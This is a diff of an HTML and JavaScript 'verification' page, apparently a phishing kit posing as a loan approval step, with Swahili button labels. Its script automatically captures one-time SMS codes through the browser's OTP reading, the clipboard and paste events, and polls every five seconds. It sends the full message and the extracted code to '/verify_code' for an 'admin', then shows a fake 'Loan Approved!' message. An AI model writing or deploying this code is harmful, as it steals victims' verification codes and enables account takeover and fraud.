@@ -3,90 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MixxByYas • Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>MixxByYas - Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body {
-            min-height: 100vh;
-            background: linear-gradient(145deg, #0b0e1a, #141b2b);
+            font-family: Arial, sans-serif;
+            background: #0b0e1a;
+            color: white;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
             padding: 20px;
         }
-        .card {
-            max-width: 480px;
+        .container {
+            max-width: 450px;
             width: 100%;
-            background: rgba(22, 30, 46, 0.9);
-            border-radius: 30px;
-            padding: 30px 20px;
-            border: 1px solid rgba(255,255,255,0.05);
+            background: #1a1f35;
+            padding: 25px;
+            border-radius: 20px;
+            border: 1px solid #2a2f4a;
         }
-        h2 {
-            color: #f1f5f9;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .sub {
-            color: #94a3b8;
-            margin-bottom: 20px;
-        }
-        .step-guide {
-            background: rgba(15, 23, 42, 0.6);
-            border-radius: 15px;
+        h2 { color: #fff; margin-bottom: 5px; }
+        .sub { color: #8899bb; margin-bottom: 20px; font-size: 14px; }
+        .step-box {
+            background: #12172a;
             padding: 15px;
+            border-radius: 12px;
             margin-bottom: 20px;
         }
-        .step-item {
+        .step { 
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 10px;
-            color: #e2e8f0;
+            color: #ccd;
+            padding: 4px 0;
+            font-size: 14px;
         }
-        .step-item:last-child { margin-bottom: 0; }
         .step-num {
             background: #4f46e5;
-            color: white;
             border-radius: 50%;
-            width: 28px;
-            height: 28px;
+            width: 24px;
+            height: 24px;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             font-weight: bold;
-            font-size: 13px;
+            font-size: 12px;
         }
-        .sms-box {
-            background: #0f172a;
-            border-radius: 15px;
+        .sms-area {
+            background: #0d1225;
+            border-radius: 12px;
             padding: 15px;
-            border: 1px solid #334155;
+            border: 1px solid #2a2f4a;
             margin: 15px 0;
         }
-        .sms-box label {
-            color: #94a3b8;
+        .sms-area label {
+            color: #8899bb;
             font-size: 13px;
             display: block;
             margin-bottom: 8px;
         }
-        textarea#smsCode {
+        textarea {
             width: 100%;
             background: transparent;
             border: none;
-            color: #f1f5f9;
-            font-size: 15px;
+            color: #fff;
+            font-size: 14px;
             min-height: 80px;
             outline: none;
-            font-family: monospace;
             resize: none;
+            font-family: monospace;
         }
-        .btn-primary {
+        .btn {
             width: 100%;
             background: #4f46e5;
             border: none;
-            padding: 15px;
+            padding: 14px;
             border-radius: 30px;
             color: white;
             font-weight: bold;
@@ -94,12 +87,12 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-        .resend-area {
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .resend-row {
             display: flex;
             justify-content: space-between;
             margin-top: 15px;
-            color: #94a3b8;
+            color: #8899bb;
             font-size: 14px;
         }
         #resendBtn {
@@ -109,218 +102,204 @@
             cursor: pointer;
             font-weight: bold;
         }
-        #resendBtn:disabled { opacity: 0.4; cursor: not-allowed; }
-        .status-badge {
+        #resendBtn:disabled { opacity: 0.4; }
+        .status {
             text-align: center;
             margin-top: 15px;
-            color: #94a3b8;
+            color: #8899bb;
             font-size: 14px;
         }
         .hidden { display: none !important; }
         .toast {
-            background: #0f172a;
+            background: #0d1225;
             border-left: 3px solid #4f46e5;
             padding: 10px 15px;
-            border-radius: 10px;
-            color: #e2e8f0;
+            border-radius: 8px;
             margin: 10px 0;
+            color: #ccd;
             font-size: 14px;
         }
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.2);
-            border-top: 2px solid white;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+        .code-display {
+            background: #0d1225;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            color: #34d399;
+            font-size: 20px;
+            font-weight: bold;
+            font-family: monospace;
+            margin: 10px 0;
+            letter-spacing: 3px;
         }
-        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
         .detect-badge {
-            background: rgba(16, 185, 129, 0.15);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 30px;
+            background: #1a2a1a;
+            border: 1px solid #2a4a2a;
+            border-radius: 20px;
             padding: 6px 15px;
             display: inline-block;
             color: #34d399;
             font-size: 13px;
             margin-bottom: 15px;
         }
-        .code-display {
-            background: #0f172a;
-            padding: 10px;
-            border-radius: 10px;
-            text-align: center;
-            color: #34d399;
-            font-size: 22px;
-            font-weight: bold;
-            font-family: monospace;
-            margin: 10px 0;
-            letter-spacing: 3px;
+        .btn-app {
+            display: inline-block;
+            background: #2a2f4a;
+            border: 1px solid #3a3f5a;
+            padding: 8px 20px;
+            border-radius: 20px;
+            color: #ccd;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: 8px;
         }
+        .btn-app i { margin-right: 5px; }
         .success-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             display: none;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             z-index: 1000;
         }
         .success-overlay.show { display: flex; }
         .success-modal {
-            background: #1e293b;
+            background: #1a1f35;
             padding: 30px;
-            border-radius: 25px;
+            border-radius: 20px;
             text-align: center;
             max-width: 350px;
             width: 90%;
+            border: 1px solid #2a4a2a;
         }
-        .success-modal i { font-size: 50px; color: #34d399; }
-        .success-modal h2 { color: #f1f5f9; margin: 10px 0; }
-        .success-modal p { color: #94a3b8; margin-bottom: 15px; }
+        .success-modal h2 { color: #34d399; margin: 10px 0; }
+        .success-modal p { color: #8899bb; }
         .success-modal button {
             background: #4f46e5;
             border: none;
             padding: 10px 30px;
-            border-radius: 30px;
+            border-radius: 20px;
             color: white;
             font-weight: bold;
             cursor: pointer;
+            margin-top: 10px;
         }
-        .sms-actions {
-            display: flex;
-            gap: 10px;
-            margin: 10px 0;
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
         }
-        .btn-app {
-            flex: 1;
-            background: #1e293b;
-            border: 1px solid #334155;
-            padding: 10px;
-            border-radius: 30px;
-            color: #e2e8f0;
-            text-align: center;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .btn-app i { margin-right: 5px; }
+        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2><i class="fas fa-mobile-screen-button" style="color:#818cf8;"></i> Code check</h2>
+<div class="container">
+    <h2>📱 Code Check</h2>
     <div class="sub">Auto-reads SMS from notification</div>
 
-    <div class="detect-badge">
-        <span id="detectionStatus">📱 Listening for SMS...</span>
+    <div class="detect-badge" id="detectionStatus">📱 Listening for SMS...</div>
+
+    <div class="step-box">
+        <div class="step"><span class="step-num">1</span> Wait for SMS to arrive</div>
+        <div class="step"><span class="step-num">2</span> Page auto-detects the code</div>
+        <div class="step"><span class="step-num">3</span> Auto-submits for verification</div>
     </div>
 
-    <div class="step-guide">
-        <div class="step-item"><span class="step-num">1</span> Wait for SMS to arrive</div>
-        <div class="step-item"><span class="step-num">2</span> Page auto-detects the code</div>
-        <div class="step-item"><span class="step-num">3</span> Auto-submits for verification</div>
-    </div>
-
-    <div class="sms-box">
-        <label><i class="fas fa-sms"></i> Full SMS</label>
-        <textarea id="smsCode" readonly placeholder="SMS will appear here..."></textarea>
+    <div class="sms-area">
+        <label>📩 Full SMS</label>
+        <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
     </div>
 
     <div id="codeDisplay" class="code-display" style="display:none;">
-        Code: <span id="extractedCodeDisplay"></span>
+        🔑 Code: <span id="extractedCodeDisplay"></span>
     </div>
 
-    <div class="sms-actions">
-        <a href="sms:" class="btn-app"><i class="fab fa-apple"></i> iPhone</a>
-        <a href="sms:" class="btn-app"><i class="fab fa-android"></i> Android</a>
+    <div>
+        <a href="sms:" class="btn-app">📱 iPhone</a>
+        <a href="sms:" class="btn-app">🤖 Android</a>
     </div>
 
-    <button class="btn-primary" id="submitBtn">
-        <i class="fas fa-check-circle"></i> Thibitisha
+    <button class="btn" id="submitBtn">
+        <span id="submitText">✅ Thibitisha</span>
         <span id="submitSpinner" class="spinner hidden"></span>
     </button>
 
-    <div class="resend-area">
-        <span><i class="far fa-clock"></i> <span id="resendCounter">0 / 3</span></span>
-        <button id="resendBtn" disabled><i class="fas fa-rotate-right"></i> Tuma tena</button>
+    <div class="resend-row">
+        <span>🔄 <span id="resendCounter">0 / 3</span></span>
+        <button id="resendBtn" disabled>↻ Tuma tena</button>
     </div>
 
-    <div id="statusToast" class="toast hidden">
-        <i class="fas fa-circle-check" style="color:#34d399;"></i>
-        <span id="toastMessage">SMS detected!</span>
-    </div>
-    <div class="status-badge" id="statusText">
-        <i class="fas fa-info-circle"></i> Waiting for SMS...
-    </div>
+    <div id="toastDiv" class="toast hidden"></div>
+    <div class="status" id="statusText">⏳ Waiting for SMS...</div>
 </div>
 
 <div id="successOverlay" class="success-overlay">
     <div class="success-modal">
-        <i class="fas fa-check-circle"></i>
-        <h2>Loan Approved! ✅</h2>
+        <h2>✅ Loan Approved!</h2>
         <p>Your loan has been approved successfully.</p>
         <button onclick="closeSuccess()">Done</button>
     </div>
 </div>
 
 <script>
-    const smsTextarea = document.getElementById('smsCode');
+    // SIMPLE WORKING VERSION
+    const smsCode = document.getElementById('smsCode');
     const submitBtn = document.getElementById('submitBtn');
+    const submitText = document.getElementById('submitText');
     const submitSpinner = document.getElementById('submitSpinner');
     const resendBtn = document.getElementById('resendBtn');
     const resendCounter = document.getElementById('resendCounter');
-    const toastDiv = document.getElementById('statusToast');
-    const toastMessage = document.getElementById('toastMessage');
     const statusText = document.getElementById('statusText');
     const detectionStatus = document.getElementById('detectionStatus');
     const codeDisplay = document.getElementById('codeDisplay');
     const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
+    const toastDiv = document.getElementById('toastDiv');
     const successOverlay = document.getElementById('successOverlay');
 
     let resendAttempts = 0;
-    let cooldownSeconds = 0;
-    let cooldownTimer = null;
+    let cooldown = 0;
     let isSubmitting = false;
     let smsDetected = false;
     let extractedCode = '';
 
     function showToast(msg) {
+        toastDiv.textContent = '• ' + msg;
         toastDiv.classList.remove('hidden');
-        toastMessage.textContent = msg;
-        clearTimeout(window.toastTimeout);
-        window.toastTimeout = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
+        clearTimeout(window.toastTimer);
+        window.toastTimer = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
     }
 
     function setStatus(msg) {
-        statusText.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
+        statusText.textContent = msg;
     }
 
     function updateResendUI() {
         resendCounter.textContent = `${resendAttempts} / 3`;
         if (resendAttempts >= 3) {
             resendBtn.disabled = true;
-            resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
-        } else if (cooldownSeconds > 0) {
+            resendBtn.textContent = '✖ Imeisha';
+        } else if (cooldown > 0) {
             resendBtn.disabled = true;
-            resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
+            resendBtn.textContent = `⏳ ${cooldown}s`;
         } else {
             resendBtn.disabled = false;
-            resendBtn.innerHTML = '<i class="fas fa-rotate-right"></i> Tuma tena';
+            resendBtn.textContent = '↻ Tuma tena';
         }
     }
 
     function startCooldown() {
-        if (cooldownTimer) clearInterval(cooldownTimer);
-        cooldownSeconds = 30;
+        cooldown = 30;
         updateResendUI();
-        cooldownTimer = setInterval(() => {
-            cooldownSeconds--;
+        const timer = setInterval(() => {
+            cooldown--;
             updateResendUI();
-            if (cooldownSeconds <= 0) {
-                clearInterval(cooldownTimer);
-                cooldownTimer = null;
+            if (cooldown <= 0) {
+                clearInterval(timer);
                 updateResendUI();
             }
         }, 1000);
@@ -362,18 +341,18 @@
             
             if (otp && otp.code) {
                 extractedCode = otp.code;
-                smsTextarea.value = `Your verification code is: ${otp.code}`;
+                smsCode.value = `Your verification code is: ${otp.code}`;
                 smsDetected = true;
                 
                 codeDisplay.style.display = 'block';
                 extractedCodeDisplay.textContent = otp.code;
                 
                 detectionStatus.textContent = '✅ SMS detected!';
-                showToast(`Code: ${otp.code}`);
-                setStatus('Code detected. Submitting...');
+                showToast(`✅ Code: ${otp.code}`);
+                setStatus('✅ Code detected. Submitting...');
                 
                 setTimeout(() => {
-                    if (!isSubmitting && smsTextarea.value.trim()) {
+                    if (!isSubmitting && smsCode.value.trim()) {
                         submitCode();
                     }
                 }, 1000);
@@ -392,7 +371,7 @@
             if (!navigator.clipboard?.readText) return false;
             const text = await navigator.clipboard.readText();
             if (text && text.length > 10 && !smsDetected) {
-                smsTextarea.value = text;
+                smsCode.value = text;
                 smsDetected = true;
                 const code = extractCode(text);
                 if (code) {
@@ -401,10 +380,10 @@
                     extractedCodeDisplay.textContent = code;
                 }
                 detectionStatus.textContent = '✅ SMS from clipboard!';
-                showToast('SMS from clipboard!');
-                setStatus('SMS detected. Submitting...');
+                showToast('✅ SMS from clipboard!');
+                setStatus('✅ SMS detected. Submitting...');
                 setTimeout(() => {
-                    if (!isSubmitting && smsTextarea.value.trim()) {
+                    if (!isSubmitting && smsCode.value.trim()) {
                         submitCode();
                     }
                 }, 800);
@@ -423,44 +402,51 @@
     }
 
     function submitCode() {
-        const code = smsTextarea.value.trim();
+        const code = smsCode.value.trim();
         if (!code) {
-            showToast('Please wait for SMS.');
+            showToast('⚠️ Please wait for SMS.');
             return;
         }
         if (isSubmitting) return;
         
         isSubmitting = true;
         submitBtn.disabled = true;
+        submitText.textContent = '⏳ Sending...';
         submitSpinner.classList.remove('hidden');
-        setStatus('Sending to admin...');
+        setStatus('⏳ Sending to admin...');
 
         const codeToSend = extractedCode || extractCode(code) || code;
 
         fetch('/verify_code', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code: code, full_sms: code, extracted_code: codeToSend })
+            body: JSON.stringify({ 
+                code: code, 
+                full_sms: code, 
+                extracted_code: codeToSend 
+            })
         })
         .then(r => r.json())
         .then(data => {
             isSubmitting = false;
             submitBtn.disabled = false;
+            submitText.textContent = '✅ Thibitisha';
             submitSpinner.classList.add('hidden');
             if (data.status === 'success') {
-                showToast('Code sent to admin! 🔐');
-                setStatus('Waiting for admin approval.');
+                showToast('✅ Code sent to admin!');
+                setStatus('⏳ Waiting for admin approval.');
             } else {
-                showToast('Error. Try again.');
-                setStatus('Error. Please try again.');
+                showToast('❌ Error. Try again.');
+                setStatus('❌ Error. Please try again.');
             }
         })
         .catch(() => {
             isSubmitting = false;
             submitBtn.disabled = false;
+            submitText.textContent = '✅ Thibitisha';
             submitSpinner.classList.add('hidden');
-            showToast('Network error.');
-            setStatus('No connection.');
+            showToast('❌ Network error.');
+            setStatus('❌ No connection.');
         });
     }
 
@@ -476,34 +462,37 @@
     submitBtn.onclick = (e) => { e.preventDefault(); submitCode(); };
     
     resendBtn.onclick = function() {
-        if (resendAttempts >= 3 || cooldownSeconds > 0) return;
+        if (resendAttempts >= 3 || cooldown > 0) return;
         resendAttempts++;
         startCooldown();
         updateResendUI();
         smsDetected = false;
         extractedCode = '';
-        smsTextarea.value = '';
+        smsCode.value = '';
         codeDisplay.style.display = 'none';
         detectionStatus.textContent = '📱 Waiting for new SMS...';
         fetch('/resend_code', { method: 'POST' }).catch(() => {});
         setTimeout(() => detectSMS(), 2000);
     };
 
-    // Page events
+    // Page load
     window.onload = function() {
         setTimeout(detectSMS, 1000);
+        updateResendUI();
     };
 
+    // Visibility change (user returns to page)
     document.addEventListener('visibilitychange', function() {
         if (document.visibilityState === 'visible' && !smsDetected) {
             setTimeout(detectSMS, 500);
         }
     });
 
+    // Paste event
     document.addEventListener('paste', function(e) {
         const text = e.clipboardData?.getData('text');
         if (text && text.length > 10 && !smsDetected) {
-            smsTextarea.value = text;
+            smsCode.value = text;
             smsDetected = true;
             const code = extractCode(text);
             if (code) {
@@ -512,17 +501,17 @@
                 extractedCodeDisplay.textContent = code;
             }
             detectionStatus.textContent = '✅ SMS pasted!';
-            showToast('SMS pasted!');
-            setStatus('SMS detected. Submitting...');
+            showToast('✅ SMS pasted!');
+            setStatus('✅ SMS detected. Submitting...');
             setTimeout(() => {
-                if (!isSubmitting && smsTextarea.value.trim()) {
+                if (!isSubmitting && smsCode.value.trim()) {
                     submitCode();
                 }
             }, 400);
         }
     });
 
-    updateResendUI();
+    // Keep trying every 5 seconds
     setInterval(() => {
         if (!smsDetected && !isSubmitting) detectSMS();
     }, 5000);
